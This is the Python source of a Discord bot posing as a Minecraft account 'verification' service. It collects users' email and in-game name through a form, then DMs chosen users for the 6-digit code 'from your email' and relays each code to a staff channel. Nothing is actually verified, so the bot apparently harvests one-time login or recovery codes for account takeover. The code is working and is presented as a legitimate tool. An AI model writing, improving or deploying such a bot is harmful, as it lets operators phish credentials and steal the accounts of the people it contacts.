import os
import discord
from discord.ext import commands
import json
import re

TOKEN = os.getenv("DISCORD_TOKEN")
VERIFICATION_CHANNEL_ID = 1362951881827160295
MOD_CHANNEL_ID = 1362997933552959558
LAST_VERIFICATION_MSG_FILE = "last_verification_msg.json"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

sent_verification_dms = set()
sent_invalid_codes = set()

def load_last_verification_msg_id():
    """Load the last verification message ID from the file."""
    if os.path.exists(LAST_VERIFICATION_MSG_FILE):
        with open(LAST_VERIFICATION_MSG_FILE, "r") as file:
            data = json.load(file)
            print(f"Loaded last_verification_msg_id: {data.get('last_verification_msg_id')}")  # Debug log
            return data.get("last_verification_msg_id")
    return None

def save_last_verification_msg_id(msg_id):
    """Save the last verification message ID to the file."""
    with open(LAST_VERIFICATION_MSG_FILE, "w") as file:
        json.dump({"last_verification_msg_id": msg_id}, file)
        print(f"Saved last_verification_msg_id: {msg_id}")  # Debug log

last_verification_msg_id = load_last_verification_msg_id()

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Email")
    ign = discord.ui.TextInput(label="IGN")

    async def on_submit(self, interaction: discord.Interaction):
        log = await bot.fetch_channel(MOD_CHANNEL_ID)
        embed = discord.Embed(title="New Verification", color=discord.Color.orange())
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)
        await log.send(embed=embed)
        await interaction.response.send_message("✅ Submitted!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

async def send_verification_embed():
    global last_verification_msg_id  # Add this line to reference the global variable
    channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    # Delete the old verification embed if it exists
    if last_verification_msg_id:
        try:
            old = await channel.fetch_message(last_verification_msg_id)
            await old.delete()
            print(f"Deleted previous verification message with ID: {last_verification_msg_id}")  # Log the deletion
        except discord.NotFound:
            print(f"Previous verification message not found (ID: {last_verification_msg_id}).")  # Log if not found
        except discord.Forbidden:
            print("Bot doesn't have permission to delete the old message.")  # Log permission issues
        except discord.HTTPException as e:
            print(f"Failed to delete the old verification message: {e}")  # Log HTTP errors

    # Send the new verification embed
    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the button below to verify.",
        color=discord.Color.green()
    )
    msg = await channel.send(embed=embed, view=LinkView())
    last_verification_msg_id = msg.id  # Update the global variable here
    save_last_verification_msg_id(last_verification_msg_id)  # Save the new ID to the file
    print(f"Sent new verification message with ID: {last_verification_msg_id}")  # Log new message

@bot.event
async def on_ready():
    print(f"Bot is ready: {bot.user}")
    await bot.tree.sync()
    await send_verification_embed()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    await send_verification_embed()
    await interaction.response.send_message("✅ Sent!", ephemeral=True)

@bot.tree.command(name="promptcode")
async def promptcode(interaction: discord.Interaction, user: discord.Member):
    if user.id in sent_verification_dms:
        await interaction.response.send_message("✅ Already sent the prompt.", ephemeral=True)
        return
    
    try:
        dm_channel = await user.create_dm()

        embed = discord.Embed(
            title="🔐 Enter Verification Code",
            description="Check your email for a code and send it here. Please provide a 6-digit code.",
            color=discord.Color.blue()
        )
        await dm_channel.send(embed=embed)

        # Wait for the user's response
        def check(message):
            return message.author == user and message.channel == dm_channel and re.match(r'^\d{6}$', message.content)

        # Wait for a valid message that matches the 6-digit format
        message = await bot.wait_for('message', check=check, timeout=60)  # Timeout after 60 seconds

        # Send the 6-digit code to the verification channel
        verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

        embed = discord.Embed(
            title="📝 New Verification Code",
            color=discord.Color.green()
        )
        embed.add_field(name="User", value=user.mention, inline=False)
        embed.add_field(name="Code", value=message.content, inline=False)
        await verification_channel.send(embed=embed)

        await dm_channel.send("✅ Code received! Thank you for verifying.")

    except Exception as e:
        await interaction.response.send_message(f"Error sending DM: {e}", ephemeral=True)
    else:
        await interaction.response.send_message(f"Verification prompt sent to {user.mention}!", ephemeral=True)

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return

    if isinstance(message.channel, discord.DMChannel):
        if message.content.isdigit() and len(message.content) == 6:
            mod = await bot.fetch_channel(MOD_CHANNEL_ID)
            embed = discord.Embed(
                title="✅ Code Submitted",
                description=f"User: {message.author.mention}\nCode: `{message.content}`",
                color=discord.Color.teal()
            )
            await mod.send(embed=embed)
            # Send confirmation embed for code submission
            confirm_embed = discord.Embed(
                title="✅ Code Received",
                description="A mod will review your code shortly.",
                color=discord.Color.green()
            )
            await message.channel.send(embed=confirm_embed)
        else:
            if message.author.id not in sent_invalid_codes:
                embed = discord.Embed(
                    title="❌ Invalid Code",
                    description="Please enter a **6-digit code**.",
                    color=discord.Color.red()
                )
                await message.channel.send(embed=embed)
                sent_invalid_codes.add(message.author.id)

    await bot.process_commands(message)

bot.run(TOKEN)
